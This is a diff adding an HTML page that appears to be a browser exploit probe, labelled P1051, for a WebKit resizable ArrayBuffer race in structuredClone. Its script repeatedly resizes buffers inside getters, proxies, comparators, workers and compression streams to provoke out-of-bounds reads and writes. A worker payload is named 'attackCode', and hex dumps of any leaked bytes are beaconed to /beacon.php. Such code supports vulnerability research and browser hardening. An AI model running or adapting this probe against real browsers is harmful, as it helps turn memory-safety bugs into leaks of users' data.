@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1051</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+h2{color:#e2e8f0;font-size:13px;margin:8px 0 4px;border-bottom:1px solid #1e2a3a;padding-bottom:2px}
+</style></head><body>
+<div id="hud"><div id="log"></div></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1051-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var L=document.getElementById('log');
+function log(m,c){var d=document.createElement('div');if(c)d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+
+bn('BOOT','ts='+Date.now().toString(36));
+log('=== P1051: Resizable ArrayBuffer TOCTOU via structuredClone ===','info');
+log('Target: WebKit Bug 278657 (CloneSerializer::dumpIfTerminal race)','info');
+log('');
+
+var totalAnomalies=0;
+var anomalyItems=[];
+
+// Check prerequisites
+var hasResize=typeof ArrayBuffer.prototype.resize==='function';
+log('ArrayBuffer.resize: '+(hasResize?'YES':'NO'),hasResize?'ok':'fail');
+
+if(!hasResize){
+  log('FATAL: resize not available, cannot proceed','fail');
+  bn('DONE','no-resize');
+}
+
+// ============================================================
+// PHASE A: Getter-triggered resize during structuredClone
+// Bug 278657: CloneSerializer reads byteLength, then iterates bytes.
+// If a getter on a co-serialized object resizes the buffer between
+// the length read and the data copy, the serializer reads OOB.
+// ============================================================
+function phaseA(){
+  log('--- Phase A: Getter-Resize During Clone ---','info');
+  var anomalies=0, errors=0, tests=0;
+  var details=[];
+
+  // Strategy: Create an object graph where:
+  // 1. First property is a normal value (forces serializer to start)
+  // 2. Later property has a getter that resizes a shared RAB
+  // 3. The RAB is also in the object graph
+  // When the serializer reaches the getter, it fires and resizes the RAB.
+  // If the serializer already read RAB.byteLength, we get a mismatch.
+
+  // A1: Shrink during clone (OOB read in serializer)
+  for(var iter=0;iter<200;iter++){
+    try{
+      var rab=new ArrayBuffer(4096,{maxByteLength:65536});
+      var u8=new Uint8Array(rab);
+      for(var i=0;i<4096;i++) u8[i]=0xAA;
+
+      var trigger={};
+      Object.defineProperty(trigger,'value',{
+        get:function(){
+          // Shrink the RAB while serializer is processing
+          try{rab.resize(64);}catch(e){}
+          return 42;
+        },
+        enumerable:true
+      });
+
+      var payload={
+        buffer:rab,
+        padding1:'A'.repeat(100),
+        padding2:'B'.repeat(100),
+        trigger:trigger,
+        buffer2:rab  // reference same RAB again to increase timing window
+      };
+
+      var cloned=structuredClone(payload);
+      tests++;
+
+      // Check if the clone captured the original 4096 bytes or the shrunk 64
+      if(cloned.buffer.byteLength!==64&&cloned.buffer.byteLength!==4096){
+        anomalies++;
+        anomalyItems.push('A1-weirdLen:'+cloned.buffer.byteLength);
+        log('A1 ANOMALY iter '+iter+': unexpected clone length: '+cloned.buffer.byteLength,'fail');
+      }
+
+      // Check for OOB data in the clone
+      var cu8=new Uint8Array(cloned.buffer);
+      var nonAA=0;
+      for(var i=0;i<cu8.length;i++){
+        if(cu8[i]!==0xAA&&cu8[i]!==0){nonAA++;}
+      }
+      if(nonAA>0){
+        anomalies++;
+        anomalyItems.push('A1-oob:'+nonAA);
+        // Dump first 32 bytes of anomalous data
+        var hex='';
+        for(var i=0;i<Math.min(32,cu8.length);i++) hex+=('0'+cu8[i].toString(16)).slice(-2)+' ';
+        log('A1 ANOMALY iter '+iter+': '+nonAA+' non-0xAA bytes! hex='+hex,'fail');
+        bn('A1-OOB','iter='+iter+'|nonAA='+nonAA+'|len='+cu8.length+'|hex='+hex);
+      }
+    }catch(e){
+      errors++;
+      if(iter===0) details.push('A1-err:'+e.message);
+    }
+  }
+  details.push('A1-tests='+tests);
+
+  // A2: Grow during clone (potential buffer overread if serializer allocated based on old size)
+  var tests2=0;
+  for(var iter=0;iter<200;iter++){
+    try{
+      var rab2=new ArrayBuffer(64,{maxByteLength:65536});
+      var u2=new Uint8Array(rab2);
+      for(var i=0;i<64;i++) u2[i]=0xBB;
+
+      var trigger2={};
+      Object.defineProperty(trigger2,'value',{
+        get:function(){
+          try{rab2.resize(8192);}catch(e){}
+          // Fill new region with marker
+          var expanded=new Uint8Array(rab2);
+          for(var i=64;i<expanded.length;i++) expanded[i]=0xCC;
+          return 99;
+        },
+        enumerable:true
+      });
+
+      var payload2={
+        trigger:trigger2,
+        buffer:rab2
+      };
+
+      var cloned2=structuredClone(payload2);
+      tests2++;
+
+      // If serializer used old length (64) but buffer grew to 8192,
+      // the clone might have 64 bytes or 8192 bytes
+      var cLen=cloned2.buffer.byteLength;
+      if(cLen!==64&&cLen!==8192){
+        anomalies++;
+        anomalyItems.push('A2-weirdLen:'+cLen);
+        log('A2 ANOMALY iter '+iter+': unexpected length: '+cLen,'fail');
+      }
+
+      // Check for leaked data (0xCC in a 64-byte clone would mean OOB was serialized)
+      if(cLen===64){
+        var check=new Uint8Array(cloned2.buffer);
+        for(var i=0;i<check.length;i++){
+          if(check[i]===0xCC){
+            anomalies++;
+            anomalyItems.push('A2-leaked:'+i);
+            log('A2 ANOMALY: 0xCC found at offset '+i+' in 64-byte clone!','fail');
+            break;
+          }
+        }
+      }
+    }catch(e){
+      errors++;
+      if(iter===0) details.push('A2-err:'+e.message);
+    }
+  }
+  details.push('A2-tests='+tests2);
+
+  // A3: Resize in valueOf/toString during clone
+  for(var iter=0;iter<100;iter++){
+    try{
+      var rab3=new ArrayBuffer(2048,{maxByteLength:32768});
+      new Uint8Array(rab3).fill(0xDD);
+
+      var trickObj={
+        valueOf:function(){rab3.resize(128);return 1;},
+        toString:function(){rab3.resize(128);return 'x';}
+      };
+
+      var payload3={
+        a:rab3,
+        b:trickObj,
+        c:rab3
+      };
+
+      var c3=structuredClone(payload3);
+      tests++;
+
+      var c3u8=new Uint8Array(c3.a.byteLength>0?c3.a:c3.c);
+      var weird=0;
+      for(var i=0;i<c3u8.length;i++){
+        if(c3u8[i]!==0xDD&&c3u8[i]!==0) weird++;
+      }
+      if(weird>0){
+        anomalies++;anomalyItems.push('A3-weird:'+weird);
+        log('A3 ANOMALY: '+weird+' unexpected bytes','fail');
+      }
+    }catch(e){errors++;}
+  }
+
+  log('Phase A: tests='+(tests+tests2)+' errors='+errors+' anomalies='+anomalies,'ok');
+  bn('A-GETTER','tests='+(tests+tests2)+'|errors='+errors+'|anomalies='+anomalies+'|'+details.join('|'));
+  totalAnomalies+=anomalies;
+  return anomalies;
+}
+
+// ============================================================
+// PHASE B: TypedArray operations on resizable buffer
+// If TypedArray.sort/fill/copyWithin/slice check length once
+// but the buffer resizes during the operation, we get OOB access
+// ============================================================
+function phaseB(){
+  log('');log('--- Phase B: TypedArray Ops on Resizable Buffer ---','info');
+  var anomalies=0, errors=0, tests=0;
+  var details=[];
+
+  // B1: sort with comparator that resizes
+  for(var iter=0;iter<100;iter++){
+    try{
+      var rab=new ArrayBuffer(4096,{maxByteLength:65536});
+      var u32=new Uint32Array(rab);
+      for(var i=0;i<u32.length;i++) u32[i]=u32.length-i;
+
+      var resizeCount=0;
+      var sorted=false;
+
+      try{
+        u32.sort(function(a,b){
+          if(!sorted&&resizeCount===0){
+            resizeCount++;
+            rab.resize(256); // shrink during sort
+          }
+          return a-b;
+        });
+        sorted=true;
+      }catch(e){
+        // TypeError expected if buffer detaches or view becomes invalid
+        details.push('B1-sort-err:'+e.name);
+      }
+
+      tests++;
+      // Check if we can still read the buffer
+      try{
+        var check=new Uint32Array(rab);
+        if(check.length>0){
+          // Look for out-of-range values that might indicate OOB read
+          for(var i=0;i<check.length;i++){
+            if(check[i]>4096){
+              anomalies++;anomalyItems.push('B1-oob:'+check[i].toString(16));
+              log('B1 ANOMALY: OOB value 0x'+check[i].toString(16)+' at index '+i,'fail');
+              break;
+            }
+          }
+        }
+      }catch(e){}
+    }catch(e){errors++;}
+  }
+  details.push('B1-tests='+tests);
+
+  // B2: copyWithin with resize in between
+  var tests2=0;
+  for(var iter=0;iter<100;iter++){
+    try{
+      var rab2=new ArrayBuffer(8192,{maxByteLength:65536});
+      var u8=new Uint8Array(rab2);
+      for(var i=0;i<8192;i++) u8[i]=i&0xFF;
+
+      // Resize then immediately copyWithin
+      rab2.resize(512);
+      try{
+        // This should work on the new size
+        var view=new Uint8Array(rab2);
+        view.copyWithin(0,256,512);
+        tests2++;
+      }catch(e){}
+
+      // Grow and check data integrity
+      rab2.resize(4096);
+      var check2=new Uint8Array(rab2);
+      // Bytes 512-4095 should be zeroed (new region)
+      var nonZero=0;
+      for(var i=512;i<4096;i++){
+        if(check2[i]!==0) nonZero++;
+      }
+      if(nonZero>0){
+        anomalies++;anomalyItems.push('B2-dirty:'+nonZero);
+        log('B2 ANOMALY: '+nonZero+' non-zero bytes in grown region! (uninitialized memory?)','fail');
+        // Dump some bytes
+        var hex='';
+        for(var i=512;i<Math.min(544,4096);i++) hex+=('0'+check2[i].toString(16)).slice(-2)+' ';
+        log('B2 hex @512: '+hex,'warn');
+        bn('B2-DIRTY','iter='+iter+'|nonZero='+nonZero+'|hex='+hex);
+      }
+    }catch(e){errors++;}
+  }
+  details.push('B2-tests='+tests2);
+
+  // B3: DataView read after resize
+  var tests3=0;
+  for(var iter=0;iter<100;iter++){
+    try{
+      var rab3=new ArrayBuffer(1024,{maxByteLength:65536});
+      var dv=new DataView(rab3);
+      dv.setUint32(0,0xDEADBEEF);
+      dv.setUint32(1020,0xCAFEBABE);
+
+      // Shrink below DataView's original range
+      rab3.resize(64);
+
+      // Reading at old offsets should throw RangeError
+      try{
+        var val=dv.getUint32(1020);
+        anomalies++;anomalyItems.push('B3-oobRead:'+val.toString(16));
+        log('B3 ANOMALY: read past shrunk buffer! val=0x'+val.toString(16),'fail');
+        bn('B3-OOB','val=0x'+val.toString(16)+'|iter='+iter);
+      }catch(e){
+        // Expected RangeError
+      }
+
+      // Writing at old offsets should throw
+      try{
+        dv.setUint32(1020,0x41414141);
+        anomalies++;anomalyItems.push('B3-oobWrite');
+        log('B3 ANOMALY: wrote past shrunk buffer!','fail');
+      }catch(e){}
+
+      tests3++;
+    }catch(e){errors++;}
+  }
+  details.push('B3-tests='+tests3);
+
+  // B4: subarray + resize race
+  var tests4=0;
+  for(var iter=0;iter<200;iter++){
+    try{
+      var rab4=new ArrayBuffer(4096,{maxByteLength:65536});
+      var u8_4=new Uint8Array(rab4);
+      for(var i=0;i<4096;i++) u8_4[i]=0xEE;
+
+      // Get subarray reference
+      var sub=u8_4.subarray(2048,4096); // last 2048 bytes
+
+      // Shrink buffer to 1024
+      rab4.resize(1024);
+
+      // subarray reference is now past the end
+      try{
+        var val=sub[0]; // Should be undefined or throw
+        if(val===0xEE){
+          anomalies++;anomalyItems.push('B4-stale:'+iter);
+          log('B4 ANOMALY: stale subarray read returned 0xEE at iter '+iter,'fail');
+        }
+      }catch(e){}
+
+      try{
+        sub[0]=0x41; // Should fail
+        // Check if write went through
+        rab4.resize(4096);
+        var verify=new Uint8Array(rab4);
+        if(verify[2048]===0x41){
+          anomalies++;anomalyItems.push('B4-staleWrite:'+iter);
+          log('B4 ANOMALY: stale subarray write succeeded!','fail');
+          bn('B4-WRITE','iter='+iter);
+        }
+      }catch(e){}
+
+      tests4++;
+    }catch(e){errors++;}
+  }
+  details.push('B4-tests='+tests4);
+
+  // B5: Grow and check for uninitialized memory
+  var tests5=0;
+  var leakedBytes=0;
+  for(var iter=0;iter<50;iter++){
+    try{
+      // Allocate, fill with pattern, transfer (to free memory), then allocate new RAB
+      // The new RAB's grown region might contain data from the freed buffer
+      var sacrificial=new ArrayBuffer(65536);
+      new Uint8Array(sacrificial).fill(0x42);
+      // "Free" it via transfer
+      structuredClone(sacrificial,{transfer:[sacrificial]});
+
+      // Now allocate a small RAB and grow it into the freed space
+      var rab5=new ArrayBuffer(64,{maxByteLength:65536});
+      rab5.resize(65536);
+
+      var scan=new Uint8Array(rab5);
+      var found42=0;
+      for(var i=64;i<scan.length;i++){
+        if(scan[i]===0x42) found42++;
+        if(scan[i]!==0) leakedBytes++;
+      }
+
+      if(found42>100){
+        anomalies++;anomalyItems.push('B5-uninit:'+found42);
+        log('B5 ANOMALY: '+found42+' bytes of 0x42 in grown region (uninitialized memory leak!)','fail');
+        bn('B5-LEAK','iter='+iter+'|found42='+found42);
+      }
+
+      tests5++;
+    }catch(e){errors++;}
+  }
+  details.push('B5-tests='+tests5+'|leaked='+leakedBytes);
+
+  log('Phase B: tests='+(tests+tests2+tests3+tests4+tests5)+' errors='+errors+' anomalies='+anomalies,'ok');
+  bn('B-TYPED','tests='+(tests+tests2+tests3+tests4+tests5)+'|errors='+errors+'|anomalies='+anomalies+'|'+details.join('|'));
+  totalAnomalies+=anomalies;
+  return anomalies;
+}
+
+// ============================================================
+// PHASE C: Proxy + RAB = custom serialization hooks
+// Proxy getters fire during serialization and can resize buffers
+// ============================================================
+function phaseC(){
+  log('');log('--- Phase C: Proxy-Triggered Resize During Serialization ---','info');
+  var anomalies=0, errors=0, tests=0;
+  var details=[];
+
+  // C1: Proxy with getter that resizes RAB during JSON.stringify
+  for(var iter=0;iter<100;iter++){
+    try{
+      var rab=new ArrayBuffer(4096,{maxByteLength:65536});
+      new Uint8Array(rab).fill(0xFF);
+
+      var proxy=new Proxy({a:1,b:2,c:3},{
+        get:function(target,prop){
+          if(prop==='toJSON'||prop==='b'){
+            try{rab.resize(128);}catch(e){}
+          }
+          return target[prop];
+        }
+      });
+
+      // JSON.stringify triggers getters
+      var json=JSON.stringify({proxy:proxy,buf:Array.from(new Uint8Array(rab))});
+      tests++;
+
+      // Check if the buf array captured data from before or after resize
+      var parsed=JSON.parse(json);
+      if(parsed.buf&&parsed.buf.length>128){
+        // Data was captured from the larger buffer
+        var afterResize=parsed.buf.slice(128);
+        var nonZero=afterResize.filter(function(b){return b!==0;}).length;
+        if(nonZero>0){
+          details.push('C1-post128='+nonZero);
+        }
+      }
+    }catch(e){errors++;}
+  }
+
+  // C2: Proxy iterator that resizes during Array.from
+  for(var iter=0;iter<100;iter++){
+    try{
+      var rab2=new ArrayBuffer(8192,{maxByteLength:65536});
+      var u8=new Uint8Array(rab2);
+      for(var i=0;i<8192;i++) u8[i]=i&0xFF;
+
+      var readCount=0;
+      var resized=false;
+
+      // Create a TypedArray-like iterable that triggers resize
+      var fakeArr={
+        length:u8.length,
+        0:u8[0]
+      };
+
+      // Use Proxy to intercept index access
+      var proxyArr=new Proxy(u8,{
+        get:function(target,prop){
+          if(prop==='length') return 8192; // Always report original length
+          var idx=parseInt(prop);
+          if(!isNaN(idx)&&idx>=4096&&!resized){
+            resized=true;
+            try{rab2.resize(2048);}catch(e){} // Shrink mid-iteration
+          }
+          try{return target[prop];}catch(e){return 0;}
+        }
+      });
+
+      try{
+        var copied=Array.from(proxyArr);
+        tests++;
+        // If Array.from continued reading past the shrunk buffer using the Proxy length...
+        if(copied.length===8192){
+          var pastEnd=0;
+          for(var i=2048;i<copied.length;i++){
+            if(copied[i]!==0&&copied[i]!==undefined) pastEnd++;
+          }
+          if(pastEnd>0){
+            anomalies++;anomalyItems.push('C2-pastEnd:'+pastEnd);
+            log('C2 ANOMALY: '+pastEnd+' non-zero values read past shrunk buffer!','fail');
+            bn('C2-OOB','iter='+iter+'|pastEnd='+pastEnd);
+          }
+        }
+      }catch(e){
+        tests++;
+        details.push('C2-threw:'+e.name);
+      }
+    }catch(e){errors++;}
+  }
+
+  // C3: MessageChannel postMessage with resize in transfer
+  for(var iter=0;iter<50;iter++){
+    try{
+      var rab3=new ArrayBuffer(4096,{maxByteLength:32768});
+      new Uint8Array(rab3).fill(0xAB);
+
+      // Create object with toJSON that resizes
+      var trap={
+        toJSON:function(){
+          rab3.resize(256);
+          return {resized:true};
+        }
+      };
+
+      // Try to clone both together
+      try{
+        var result=structuredClone({trap:trap,buf:rab3});
+        tests++;
+        var rLen=result.buf.byteLength;
+        if(rLen!==256&&rLen!==4096){
+          anomalies++;anomalyItems.push('C3-len:'+rLen);
+          log('C3 ANOMALY: unexpected buffer length: '+rLen,'fail');
+        }
+      }catch(e){
+        tests++;
+        details.push('C3-err:'+e.name);
+      }
+    }catch(e){errors++;}
+  }
+
+  log('Phase C: tests='+tests+' errors='+errors+' anomalies='+anomalies,'ok');
+  bn('C-PROXY','tests='+tests+'|errors='+errors+'|anomalies='+anomalies+'|'+details.join('|'));
+  totalAnomalies+=anomalies;
+  return anomalies;
+}
+
+// ============================================================
+// PHASE D: Worker creation test + concurrent resize
+// ============================================================
+function phaseD(){
+  log('');log('--- Phase D: Worker Test + Blob URL Tricks ---','info');
+  var anomalies=0, errors=0, tests=0;
+  var details=[];
+
+  // D1: Try creating a Worker
+  try{
+    var workerCode='self.onmessage=function(e){self.postMessage({echo:e.data})};';
+    var blob=new Blob([workerCode],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+
+    var workerOK=false;
+    try{
+      var w=new Worker(url);
+      workerOK=true;
+      details.push('worker=YES');
+      log('D1: Worker created!','ok');
+
+      // Test if we can send RAB to worker
+      w.onmessage=function(e){
+        details.push('worker-echo='+JSON.stringify(e.data).slice(0,50));
+      };
+      w.postMessage('ping');
+
+      // Try transferring a buffer to worker
+      try{
+        var testBuf=new ArrayBuffer(1024);
+        new Uint8Array(testBuf).fill(0x77);
+        w.postMessage({buf:testBuf},[testBuf]);
+        if(testBuf.byteLength===0){
+          details.push('worker-transfer=OK');
+        }
+      }catch(e){
+        details.push('worker-transfer='+e.name);
+      }
+
+      setTimeout(function(){w.terminate();},500);
+    }catch(e){
+      details.push('worker=NO:'+e.message.slice(0,60));
+      log('D1: Worker failed: '+e.message,'warn');
+    }
+    URL.revokeObjectURL(url);
+    tests++;
+  }catch(e){
+    errors++;
+    details.push('worker=ERR:'+e.message.slice(0,40));
+  }
+
+  // D2: Try SharedArrayBuffer (prerequisite for concurrent resize)
+  try{
+    var sab=new SharedArrayBuffer(1024);
+    details.push('SAB=YES');
+    log('D2: SharedArrayBuffer available!','ok');
+
+    // Test Atomics
+    var i32=new Int32Array(sab);
+    Atomics.store(i32,0,42);
+    var val=Atomics.load(i32,0);
+    details.push('atomics='+(val===42?'OK':'FAIL'));
+  }catch(e){
+    details.push('SAB=NO');
+    log('D2: No SharedArrayBuffer','info');
+  }
+
+  // D3: ServiceWorker test
+  try{
+    if('serviceWorker' in navigator){
+      details.push('SW=navigator');
+      // Don't actually register (would need HTTPS)
+    }else{
+      details.push('SW=NO');
+    }
+  }catch(e){details.push('SW=ERR');}
+
+  // D4: Try Blob URL Worker with inline structuredClone attack
+  try{
+    var attackCode=[
+      'self.onmessage=function(e){',
+      '  var rab=new ArrayBuffer(4096,{maxByteLength:65536});',
+      '  var u8=new Uint8Array(rab);',
+      '  for(var i=0;i<4096;i++) u8[i]=0xDD;',
+      '  var resized=false;',
+      '  var trigger={};',
+      '  Object.defineProperty(trigger,"val",{',
+      '    get:function(){if(!resized){resized=true;rab.resize(128);}return 1;},',
+      '    enumerable:true',
+      '  });',
+      '  try{',
+      '    var c=structuredClone({t:trigger,b:rab});',
+      '    var cu8=new Uint8Array(c.b);',
+      '    var nonDD=0;',
+      '    for(var i=0;i<cu8.length;i++){if(cu8[i]!==0xDD&&cu8[i]!==0)nonDD++;}',
+      '    self.postMessage({len:c.b.byteLength,nonDD:nonDD});',
+      '  }catch(ex){',
+      '    self.postMessage({err:ex.message});',
+      '  }',
+      '};'
+    ].join('\n');
+
+    var attackBlob=new Blob([attackCode],{type:'application/javascript'});
+    var attackUrl=URL.createObjectURL(attackBlob);
+
+    try{
+      var aw=new Worker(attackUrl);
+      aw.onmessage=function(e){
+        tests++;
+        details.push('worker-clone='+JSON.stringify(e.data));
+        if(e.data.nonDD&&e.data.nonDD>0){
+          anomalies++;anomalyItems.push('D4-workerOOB:'+e.data.nonDD);
+          log('D4 ANOMALY: Worker structuredClone OOB! '+e.data.nonDD+' unexpected bytes','fail');
+          bn('D4-WORKER-OOB',JSON.stringify(e.data));
+        }
+        aw.terminate();
+      };
+      aw.onerror=function(e){
+        details.push('worker-clone-err='+(e.message||'unknown').slice(0,50));
+        aw.terminate();
+      };
+      aw.postMessage('go');
+    }catch(e){
+      details.push('worker-clone=NO:'+e.message.slice(0,40));
+    }
+
+    URL.revokeObjectURL(attackUrl);
+  }catch(e){errors++;}
+
+  // Wait a bit for worker results
+  return new Promise(function(resolve){
+    setTimeout(function(){
+      log('Phase D: tests='+tests+' errors='+errors+' anomalies='+anomalies,'ok');
+      bn('D-WORKER','tests='+tests+'|errors='+errors+'|anomalies='+anomalies+'|'+details.join('|'));
+      totalAnomalies+=anomalies;
+      resolve(anomalies);
+    },2000);
+  });
+}
+
+// ============================================================
+// PHASE E: CompressionStream + resizable buffer
+// Feed a resizable buffer to CompressionStream, resize during compression
+// ============================================================
+function phaseE(){
+  log('');log('--- Phase E: CompressionStream + Resizable Buffer ---','info');
+  var anomalies=0, errors=0, tests=0;
+  var details=[];
+
+  if(typeof CompressionStream==='undefined'){
+    bn('E-COMPRAB','unavailable');
+    return Promise.resolve(0);
+  }
+
+  // E1: Write RAB chunk then resize before stream processes it
+  function testCompressResize(){
+    return new Promise(function(resolve){
+      try{
+        var rab=new ArrayBuffer(8192,{maxByteLength:65536});
+        new Uint8Array(rab).fill(0xEE);
+
+        var cs=new CompressionStream('gzip');
+        var writer=cs.writable.getWriter();
+        var reader=cs.readable.getReader();
+
+        // Write the RAB view
+        var view=new Uint8Array(rab);
+        writer.write(view);
+
+        // Immediately resize (before compression might process)
+        rab.resize(128);
+
+        writer.close();
+
+        var compressed=[];
+        function pump(){
+          return reader.read().then(function(r){
+            if(r.done) return;
+            compressed.push(new Uint8Array(r.value));
+            return pump();
+          });
+        }
+
+        pump().then(function(){
+          // Decompress and check
+          var ds=new DecompressionStream('gzip');
+          var dw=ds.writable.getWriter();
+          var dr=ds.readable.getReader();
+
+          for(var i=0;i<compressed.length;i++) dw.write(compressed[i]);
+          dw.close();
+
+          var decompressed=[];
+          function pump2(){
+            return dr.read().then(function(r){
+              if(r.done) return;
+              decompressed.push(new Uint8Array(r.value));
+              return pump2();
+            });
+          }
+
+          return pump2().then(function(){
+            var totalLen=0;
+            for(var i=0;i<decompressed.length;i++) totalLen+=decompressed[i].length;
+            tests++;
+
+            // Should be either 8192 (original) or 128 (resized) or something in between
+            details.push('E1-decomp='+totalLen);
+
+            if(totalLen!==8192&&totalLen!==128){
+              anomalies++;anomalyItems.push('E1-len:'+totalLen);
+              log('E1 ANOMALY: decompressed length '+totalLen+' (not 8192 or 128)','fail');
+            }
+
+            // Check for unexpected data
+            var result=new Uint8Array(totalLen);
+            var off=0;
+            for(var i=0;i<decompressed.length;i++){
+              result.set(decompressed[i],off);
+              off+=decompressed[i].length;
+            }
+
+            var nonEE=0;
+            for(var i=0;i<Math.min(result.length,8192);i++){
+              if(result[i]!==0xEE&&result[i]!==0) nonEE++;
+            }
+            if(nonEE>0){
+              anomalies++;anomalyItems.push('E1-data:'+nonEE);
+              log('E1 ANOMALY: '+nonEE+' unexpected bytes in decompressed data','fail');
+            }
+
+            resolve();
+          });
+        }).catch(function(e){
+          errors++;
+          details.push('E1-err:'+e.message.slice(0,50));
+          resolve();
+        });
+      }catch(e){
+        errors++;
+        details.push('E1-exn:'+e.message.slice(0,50));
+        resolve();
+      }
+    });
+  }
+
+  // E2: Multiple rapid resize + compress cycles
+  function testRapidResize(){
+    var chain=Promise.resolve();
+    var cycleResults=[];
+
+    for(var c=0;c<20;c++){
+      (function(cycle){
+        chain=chain.then(function(){
+          return new Promise(function(resolve){
+            var rab=new ArrayBuffer(1024,{maxByteLength:16384});
+            new Uint8Array(rab).fill(cycle&0xFF);
+
+            var cs=new CompressionStream('deflate');
+            var w=cs.writable.getWriter();
+            var r=cs.readable.getReader();
+
+            w.write(new Uint8Array(rab));
+            // Resize multiple times rapidly
+            rab.resize(4096);
+            rab.resize(256);
+            rab.resize(8192);
+            w.close();
+
+            var chunks=[];
+            function pump(){
+              return r.read().then(function(res){
+                if(res.done) return;
+                chunks.push(res.value);
+                return pump();
+              });
+            }
+
+            pump().then(function(){
+              tests++;
+              cycleResults.push(cycle+':ok');
+              resolve();
+            }).catch(function(e){
+              errors++;
+              cycleResults.push(cycle+':'+e.message.slice(0,20));
+              resolve();
+            });
+          });
+        });
+      })(c);
+    }
+
+    return chain.then(function(){
+      details.push('E2-cycles='+cycleResults.length);
+    });
+  }
+
+  return testCompressResize().then(testRapidResize).then(function(){
+    log('Phase E: tests='+tests+' errors='+errors+' anomalies='+anomalies,'ok');
+    bn('E-COMPRAB','tests='+tests+'|errors='+errors+'|anomalies='+anomalies+'|'+details.join('|'));
+    totalAnomalies+=anomalies;
+    return anomalies;
+  });
+}
+
+// ============================================================
+// Run all phases
+// ============================================================
+setTimeout(function(){
+  try{
+    // Sync phases
+    phaseA();
+    phaseB();
+    phaseC();
+
+    // Async phases
+    phaseD().then(function(){
+      return phaseE();
+    }).then(function(){
+      log('');
+      log('=== P1051 COMPLETE: total anomalies = '+totalAnomalies+' ===',totalAnomalies>0?'fail':'ok');
+      if(anomalyItems.length>0){
+        log('Anomaly items: '+anomalyItems.join(', '),'warn');
+      }
+      bn('DONE','anomalies='+totalAnomalies+'|items='+anomalyItems.join(';'));
+    }).catch(function(e){
+      log('FATAL: '+e.message,'fail');
+      bn('FATAL',e.message);
+    });
+  }catch(e){
+    log('TOP FATAL: '+e.message,'fail');
+    bn('FATAL','top:'+e.message);
+  }
+},200);
+</script></body></html>
